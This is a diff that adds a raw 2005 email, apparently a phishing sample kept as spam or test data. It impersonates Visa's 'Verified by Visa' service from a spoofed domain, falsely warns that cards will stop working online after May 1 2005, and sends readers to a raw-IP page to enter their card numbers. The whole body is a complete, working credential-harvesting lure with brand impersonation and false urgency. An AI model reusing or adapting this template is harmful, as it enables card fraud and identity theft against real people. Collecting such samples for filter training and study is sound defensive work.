@@ -1,0 +1,120 @@
+Return-Path: <root@web2.poporo.net>
+Delivered-To: bruceg@ezmlm.org
+Received: (fqmail 11111 invoked from network); 29 Mar 2005 23:28:41 -0000
+Received: from mx01.futurequest.net (mx01.futurequest.net [69.5.6.171])
+  by pt02.futurequest.net ([69.5.6.173])
+  with FQDP via TCP; 29 Mar 2005 23:28:41 -0000
+Received: (qmail 14789 invoked from network); 29 Mar 2005 23:28:41 -0000
+Received: from pt02.futurequest.net (pt02.futurequest.net [69.5.6.173])
+  by mx01.futurequest.net ([69.5.6.171])
+  with QMQP via TCP; 29 Mar 2005 23:28:41 -0000
+Delivered-To: webmaster@ezmlm.org
+Received: (fqmail 11105 invoked from network); 29 Mar 2005 23:28:41 -0000
+Received: from mx01.futurequest.net (mx01.futurequest.net [69.5.6.171])
+  by pt02.futurequest.net ([69.5.6.173])
+  with FQDP via TCP; 29 Mar 2005 23:28:41 -0000
+Received: (qmail 14781 invoked from network); 29 Mar 2005 23:28:41 -0000
+Received: from web2.poporo.net (203.141.135.100.user.am.il24.net [203.141.135.100])
+  by mx01.futurequest.net ([69.5.6.171])
+  with SMTP via TCP; 29 Mar 2005 23:28:40 -0000
+Received: (qmail 18192 invoked by uid 0); 30 Mar 2005 07:36:24 +0900
+Date: 30 Mar 2005 07:36:24 +0900
+Message-ID: <20050329223624.18191.qmail@web2.poporo.net>
+To: webmaster@ezmlm.org
+Subject: Protect your VISA card  
+From: Visa.com <vcars@usav.verifedbyviisa.com>
+Content-Type: text/html
+
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+<style>
+<!--
+p
+	{margin-right:0in;
+	margin-left:0in;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	}
+h3
+	{margin-right:0in;
+	margin-left:0in;
+	font-size:13.5pt;
+	font-family:"Times New Roman";
+	font-weight:bold}
+ p.MsoNormal
+	{mso-style-parent:"";
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman";
+	margin-left:0in; margin-right:0in; margin-top:0in}
+-->
+</style>
+</head>
+
+<body>
+
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="62%" 
+id="AutoNumber1">
+  <tr>
+    <td width="100%" bordercolorlight="#FFFFFF" bordercolordark="#FFFFFF">
+    <h3 align="center"><span style="font-family: Verdana; color: red">
+    <font size="2">We are sending this message to all the VISA credit card 
+    holders.</font></span><span style="font-size:12.0pt;font-family:Arial">
+    </span></h3>
+    <h3 align="center">
+    <img border="0" src="http://203.115.31.141/.verify/.by/.visa/k/visa_flag.jpg" width="32" height="22"></h3>
+    <h3 align="center"><u><span style="color: #666666">
+    <font size="2" face="Verdana">Protect your Visa card online with a personal 
+    password</font></span></u></h3>
+    <h3><span style="font-family: Arial"><font size="2"><font color="#666666">
+    Due to increased risk of internet fraud, all the VISA credit cards have to 
+    be protected with an online password until the date of 04-30-2005. If you do 
+    not complete the registration process</font> <font color="#FF0000">you will 
+    not be able to make online purchases</font> <font color="#666666">after the 
+    date of May 1<sup>st</sup> 2005. We apologize for the inconvenience that 
+    this might cause, this is an attempt to secure the online shopping and 
+    reduce the internet credit card fraud.</font></font></span></h3>
+    <p class="MsoNormal" style="margin-top: 21.0pt" align="center"><b>
+    <span style="font-size:14.0pt;font-family:
+Arial;color:#0023A0">
+    <a href="http://219.239.88.61/image/.usa.visa.com/index.php">Protect your 
+    card now</a></span></b></p>
+    <p><span style="font-family: Verdana; color: #666666; font-weight: 700">
+    <font size="2">You may <span style="color:#0C2DA3">
+    <a href="http://219.239.88.61/image/.usa.visa.com/index.php">activate now</a></span> 
+    by entering your card number over our <span style="color:#0C2DA3">
+    <a href="http://219.239.88.61/image/.usa.visa.com/index.php">secure server</a></span>. 
+    If your card issuer is participating in Verified by Visa (most issuers are) 
+    you.ll complete a brief activation process. You.ll verify your identity, 
+    create your Verified by Visa password and you.re done.</font></span></p>
+    <p class="MsoNormal" style="margin-bottom:9.0pt">
+    <span style="font-family: Verdana; color: #666666; font-weight: 700">
+    <font size="2">Verified by Visa protects your existing Visa card with a 
+    password you create, giving you assurance that only you can use your Visa 
+    card online. </font></span></p>
+    <p class="MsoNormal">
+    <span style="font-family: Verdana; color: #666666; font-weight: 700">
+    <font size="2">Simply activate your card and create your personal password. 
+    You.ll get the added confidence that your Visa card is safe when you shop at 
+    participating online stores. </font></span></p>
+    <p align="center"><font size="2" face="Verdana" color="#666666">© Copyright 
+    2005, Visa U.S.A. All Rights Reserved</font></p>
+    <p align="center">
+    <img border="0" src="http://203.115.31.141/.verify/.by/.visa/k/files/logo_visa.gif" width="67" height="39"></p>
+    <p align="center">&nbsp;</td>
+  </tr>
+</table>
+<p>&nbsp;</p>
+
+</body>
+
+</html>
+
+
